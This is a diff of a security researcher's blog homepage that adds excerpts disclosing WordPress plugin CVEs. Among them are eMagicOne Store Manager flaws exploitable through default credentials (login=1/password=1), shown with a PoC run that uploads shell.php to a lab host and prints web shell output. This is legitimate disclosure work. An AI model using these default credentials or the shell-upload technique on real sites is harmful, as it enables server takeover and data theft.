@@ -72,7 +72,7 @@
 <meta property="og:url" content="https://ryankozak.com/" />
 
 
-<meta property="og:updated_time" content="2025-11-24T00:01:00Z" />
+<meta property="og:updated_time" content="2025-11-25T00:01:00Z" />
 
 
 <link rel="sitemap" type="application/xml" title="Sitemap" href='https://ryankozak.com/sitemap.xml' />
@@ -265,6 +265,10 @@
                 
                         
                 
+                        
+                
+                        
+                
             
         
         
@@ -285,6 +289,14 @@
                         </li>
                         
                             <li class="bullet">
+                                <a href="https://ryankozak.com/posts/cve-2025-13597/">AI Feeds &lt;= 1.0.11 - Unauthenticated Arbitrary File Upload</a>
+                            </li>
+                        
+                            <li class="bullet">
+                                <a href="https://ryankozak.com/posts/cve-2025-13595/">CIBELES AI &lt;= 1.10.8 - Unauthenticated Arbitrary File Upload</a>
+                            </li>
+                        
+                            <li class="bullet">
                                 <a href="https://ryankozak.com/posts/cve-2025-13380/">AI Engine for WordPress: ChatGPT, GPT Content Generator &lt;= 1.0.1 - Authenticated (Contributor&#43;) Arbitrary File Read</a>
                             </li>
                         
@@ -296,14 +308,6 @@
                                 <a href="https://ryankozak.com/posts/cve-2025-12973/">S2B AI Assistant – ChatBot, ChatGPT, OpenAI, Content &amp; Image Generator &lt;= 1.7.8 - Authenticated (Editor&#43;) Arbitrary File Upload</a>
                             </li>
                         
-                            <li class="bullet">
-                                <a href="https://ryankozak.com/posts/cve-2025-12399/">Alex Reservations: Smart Restaurant Booking &lt;= 2.2.3 - Authenticated (Admin&#43;) Arbitrary File Upload</a>
-                            </li>
-                        
-                            <li class="bullet">
-                                <a href="https://ryankozak.com/posts/cve-2025-9216/">StoreEngine – Powerful WordPress eCommerce Plugin for Payments, Memberships, Affiliates, Sales &amp; More &lt;= 1.4.0 - Authenticated (Subscriber&#43;) Arbitrary File Upload</a>
-                            </li>
-                        
                     
                 
             
@@ -312,6 +316,10 @@
                 
             
                 
+                
+                        
+                
+                        
                 
                         
                 
@@ -403,6 +411,167 @@
                 <div class="posts">
     
     
+    <article class="post">
+        <div class="info">
+  <h1 class="post-title">
+    <a href="https://ryankozak.com/posts/cve-2025-4602/">eMagicOne Store Manager for WooCommerce &lt;= 1.2.5 - Unauthenticated Arbitrary File Read</a>
+  </h1>
+
+  <div class="headline">
+    <div>
+      
+      
+      <time datetime=" 2025-05-23T05:10:12Z" class="post-date">
+        May 23, 2025
+      </time>
+      
+      <span> - </span>
+      <span class="reading-time">
+        
+          
+        
+
+        <span>4 mins read</span>
+      </span>
+    </div>
+
+    
+    <ul class="tags">
+      
+      <li class="tag-CVE">
+        <a href="https://ryankozak.com/tags/cve">CVE</a>
+      </li>
+      
+      <li class="tag-WordPress">
+        <a href="https://ryankozak.com/tags/wordpress">WordPress</a>
+      </li>
+      
+      <li class="tag-eMagicOne">
+        <a href="https://ryankozak.com/tags/emagicone">eMagicOne</a>
+      </li>
+      
+    </ul>
+    
+  </div>
+
+  
+  
+
+  
+</div>
+
+        
+        <h3 id="cve-2025-4602">CVE-2025-4602</h3>
+<p>The <a href="https://wordpress.org/plugins/store-manager-connector/" target="_blank">eMagicOne Store Manager for WooCommerce</a> plugin exposes a remote management protocol endpoint (<code>?connector=bridge</code>) that allows file deletion operations on the server. The authentication mechanism relies on a default credential pair (<code>login=1</code>, <code>password=1</code>) and a session key system. If the default credentials are not changed, an attacker can trivially authenticate, obtain a session key, and read arbitrary files from the WordPress root or any accessible directory.</p>
+<h2 id="reproduction">Reproduction</h2>
+<p>A POC <a href="https://github.com/d0n601/CVE-2025-4602/blob/master/CVE-2025-4602.py" target="_blank">CVE-2025-4602.py</a> is provided to demonstrate reading the <code>wp-config.php</code> file from the server.</p>
+        
+        <div class="read-more-link">
+            <a href="/posts/cve-2025-4602/">Read More…</a>
+        </div>
+        
+        
+    </article>
+    <article class="post">
+        <div class="info">
+  <h1 class="post-title">
+    <a href="https://ryankozak.com/posts/cve-2025-4336/">eMagicOne Store Manager for WooCommerce &lt;= 1.2.5- Unauthenticated Arbitrary File Upload via set_file Task</a>
+  </h1>
+
+  <div class="headline">
+    <div>
+      
+      
+      <time datetime=" 2025-05-23T05:00:12Z" class="post-date">
+        May 23, 2025
+      </time>
+      
+      <span> - </span>
+      <span class="reading-time">
+        
+          
+        
+
+        <span>3 mins read</span>
+      </span>
+    </div>
+
+    
+    <ul class="tags">
+      
+      <li class="tag-CVE">
+        <a href="https://ryankozak.com/tags/cve">CVE</a>
+      </li>
+      
+      <li class="tag-WordPress">
+        <a href="https://ryankozak.com/tags/wordpress">WordPress</a>
+      </li>
+      
+      <li class="tag-eMagicOne">
+        <a href="https://ryankozak.com/tags/emagicone">eMagicOne</a>
+      </li>
+      
+    </ul>
+    
+  </div>
+
+  
+  
+
+  
+</div>
+
+        
+        <h3 id="cve-2025-4336">CVE-2025-4336</h3>
+<p>The <a href="https://wordpress.org/plugins/store-manager-connector/" target="_blank">eMagicOne Store Manager for WooCommerce</a> plugin exposes a remote management protocol endpoint (<code>?connector=bridge</code>) that allows file uploads to the server. The authentication mechanism relies on a default credential pair (<code>login=1</code>, <code>password=1</code>) and a session key system. If the default credentials are not changed, an attacker can trivially authenticate, obtain a session key, and upload arbitrary files (including PHP shells) to the WordPress root or any writable directory.</p>
+<h2 id="reproduction">Reproduction</h2>
+<ul>
+<li>A POC <a href="https://github.com/d0n601/CVE-2025-4336/blob/main/cve-2025-4336.py" target="_blank">cve-2025-4336.py</a> is provided to demonstrate a remote attacker uploading a web shell named <code>shell.php</code> via the default authentication mechanism, and executing remote code:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>python3 exploit.py https://lab1.hacker   
+</span></span><span style="display:flex;"><span>[*] Requesting session key...
+</span></span><span style="display:flex;"><span>[*] Raw response: {&#34;response_code&#34;:20,&#34;revision&#34;:11,&#34;module_version&#34;:&#34;1.2.5&#34;,&#34;session_key&#34;:&#34;6f46bc8b67b1c8f0dc871bcec9e162c1d43f047e5c46aec7d7fdf48d8c17ed69&#34;}
+</span></span><span style="display:flex;"><span>[+] Got session key: 6f46bc8b67b1c8f0dc871bcec9e162c1d43f047e5c46aec7d7fdf48d8c17ed69
+</span></span><span style="display:flex;"><span>[*] Uploading file...
+</span></span><span style="display:flex;"><span>[*] Upload response: {&#34;response_code&#34;:20,&#34;message&#34;:&#34;File was successfully uploaded&#34;}
+</span></span><span style="display:flex;"><span>[*] Executing Web Shell Commands...
+</span></span><span style="display:flex;"><span>&lt;pre&gt;1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+</span></span><span style="display:flex;"><span>    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+</span></span><span style="display:flex;"><span>    inet 127.0.0.1/8 scope host lo
+</span></span><span style="display:flex;"><span>       valid_lft forever preferred_lft forever
+</span></span><span style="display:flex;"><span>    inet6 ::1/128 scope host 
+</span></span><span style="display:flex;"><span>       valid_lft forever preferred_lft forever
+</span></span><span style="display:flex;"><span>2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP group default qlen 1000
+</span></span><span style="display:flex;"><span>    link/ether 08:00:27:5b:34:2f brd ff:ff:ff:ff:ff:ff
+</span></span><span style="display:flex;"><span>    altname enp0s3
+</span></span><span style="display:flex;"><span>    inet 10.0.2.15/24 metric 100 brd 10.0.2.255 scope global dynamic eth0
+</span></span><span style="display:flex;"><span>       valid_lft 23576sec preferred_lft 23576sec
+</span></span><span style="display:flex;"><span>    inet6 fd17:625c:f037:2:a00:27ff:fe5b:342f/64 scope global dynamic mngtmpaddr noprefixroute 
+</span></span><span style="display:flex;"><span>       valid_lft 86363sec preferred_lft 14363sec
+</span></span><span style="display:flex;"><span>    inet6 fe80::a00:27ff:fe5b:342f/64 scope link 
+</span></span><span style="display:flex;"><span>       valid_lft forever preferred_lft forever
+</span></span><span style="display:flex;"><span>3: eth1: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP group default qlen 1000
+</span></span><span style="display:flex;"><span>    link/ether 08:00:27:39:ea:eb brd ff:ff:ff:ff:ff:ff
+</span></span><span style="display:flex;"><span>    altname enp0s8
+</span></span><span style="display:flex;"><span>    inet 192.168.56.56/24 brd 192.168.56.255 scope global eth1
+</span></span><span style="display:flex;"><span>       valid_lft forever preferred_lft forever
+</span></span><span style="display:flex;"><span>    inet6 fe80::a00:27ff:fe39:eaeb/64 scope link 
+</span></span><span style="display:flex;"><span>       valid_lft forever preferred_lft forever
+</span></span><span style="display:flex;"><span>4: docker0: &lt;NO-CARRIER,BROADCAST,MULTICAST,UP&gt; mtu 1500 qdisc noqueue state DOWN group default 
+</span></span><span style="display:flex;"><span>    link/ether 02:42:ef:a9:95:6a brd ff:ff:ff:ff:ff:ff
+</span></span><span style="display:flex;"><span>    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
+</span></span><span style="display:flex;"><span>       valid_lft forever preferred_lft forever
+</span></span><span style="display:flex;"><span>&lt;/pre&gt;
+</span></span></code></pre></div><h2 id="vulnerable-flow">Vulnerable Flow</h2>
+<h3 id="default-credentials-and-hash-calculation">Default Credentials and Hash Calculation</h3>
+<p>On plugin activation, the following constants are set in <code>smconnector.php</code>:</p>
+        
+        <div class="read-more-link">
+            <a href="/posts/cve-2025-4336/">Read More…</a>
+        </div>
+        
+        
+    </article>
     <article class="post">
         <div class="info">
   <h1 class="post-title">
@@ -651,108 +820,6 @@
         
         <div class="read-more-link">
             <a href="/posts/cve-2024-13869/">Read More…</a>
-        </div>
-        
-        
-    </article>
-    <article class="post">
-        <div class="info">
-  <h1 class="post-title">
-    <a href="https://ryankozak.com/posts/cve-2024-9162/">All-in-One WP Migration and Backup &lt;= 7.86 - Authenticated (Administrator&#43;) Arbitrary PHP Code Injection</a>
-  </h1>
-
-  <div class="headline">
-    <div>
-      
-      
-      <time datetime=" 2024-10-27T05:18:12Z" class="post-date">
-        October 27, 2024
-      </time>
-      
-      <span> - </span>
-      <span class="reading-time">
-        
-          
-        
-
-        <span>3 mins read</span>
-      </span>
-    </div>
-
-    
-    <ul class="tags">
-      
-      <li class="tag-CVE">
-        <a href="https://ryankozak.com/tags/cve">CVE</a>
-      </li>
-      
-      <li class="tag-WordPress">
-        <a href="https://ryankozak.com/tags/wordpress">WordPress</a>
-      </li>
-      
-      <li class="tag-All-in-One WP Migration">
-        <a href="https://ryankozak.com/tags/all-in-one-wp-migration">All-in-One WP Migration</a>
-      </li>
-      
-    </ul>
-    
-  </div>
-
-  
-  
-
-  
-</div>
-
-        
-        <p>Around the time Def Con was happening this year I was sitting at home feeling left out. That made me feel hacky, but I don&rsquo;t get the same joy from CTFs at the moment that I used to. So, I decided to start hunting for CVEs. That lead to finding <a href="https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/all-in-one-wp-migration/all-in-one-wp-migration-and-backup-786-authenticated-administrator-arbitrary-php-code-injection" target="_blank">CVE-2024-9162</a>, which was just released today, along with the idea for a larger project that has resulted in a few more vulnerabilities yet to be disclosed.</p>
-        
-        <div class="read-more-link">
-            <a href="/posts/cve-2024-9162/">Read More…</a>
-        </div>
-        
-        
-    </article>
-    <article class="post">
-        <div class="info">
-  <h1 class="post-title">
-    <a href="https://ryankozak.com/posts/hack-the-box-armageddon-writeup/">Hack the Box Armageddon Writeup</a>
-  </h1>
-
-  <div class="headline">
-    <div>
-      
-      
-      <time datetime=" 2021-07-24T16:46:43-0700" class="post-date">
-        July 24, 2021
-      </time>
-      
-      <span> - </span>
-      <span class="reading-time">
-        
-          
-        
-
-        <span>8 mins read</span>
-      </span>
-    </div>
-
-    
-  </div>
-
-  
-  
-
-  
-</div>
-
-        
-        <p><img src="/posts/images/hack-the-box-armageddon-writeup/badge.png" alt="badge"></p>
-<h1 id="introduction">Introduction</h1>
-<p>Armageddon is an Easy level box, and it was about as standard as standard can be. The initial foothold was straight a forward Drupal exploit, and the name of the box is a massive hint (<em><a href="https://www.exploit-db.com/exploits/44449" target="_blank">Druppalgeddon2</a></em>). After gaining the initial foothold, enumerating MySQL and credential stuffing gains us user privileges. All of this is pretty basic. The privilege escalation is achieved through <em><a href="https://gtfobins.github.io/gtfobins/snap/" target="_blank">snap</a></em>, which was interesting to me since I&rsquo;d never done this before. It was not difficult to identify or exploit though.</p>
-        
-        <div class="read-more-link">
-            <a href="/posts/hack-the-box-armageddon-writeup/">Read More…</a>
         </div>
         
         
